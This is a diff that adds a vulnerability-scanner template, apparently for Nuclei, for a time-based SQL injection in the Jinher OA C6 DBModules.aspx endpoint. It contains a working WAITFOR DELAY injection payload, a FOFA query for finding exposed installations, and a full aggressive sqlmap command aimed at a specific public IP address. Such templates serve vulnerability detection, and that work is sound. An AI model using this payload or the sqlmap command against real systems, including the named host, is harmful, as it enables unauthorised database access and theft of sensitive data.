@@ -1,0 +1,30 @@
+id: jinher-oa-c6-DBModules-sqli
+info:
+  name: 金和 oa c6 DBModules.aspx - sqli
+  author: leadlife
+  severity: high
+  description: 北京金和网络股份有限公司C6协同管理平台DBModules.aspx存在SQL注入漏洞，攻击者可获取数据库敏感数据。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA-C6%E5%8D%8F%E5%90%8C%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0DBModules.aspx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="/jc6/platform/sys/login" || body="JHSoft.Web.AddMenu" || app="金和网络-金和OA" || "JC6金和协同管理平台"
+    sqlmap: sqlmap -u "http://123.56.162.103:88/C6/JHSoft.Web.WorkFlat/DBModules.aspx/?interfaceID=1" -p interfaceID  --batch --risk 3 --level 5 --tamper=space2comment --dbms=mssql
+  tags: 2024,sqli,time,jinher,oa
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        GET /C6/JHSoft.Web.WorkFlat/DBModules.aspx/?interfaceID=1;WAITFOR+DELAY+'0:0:6'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
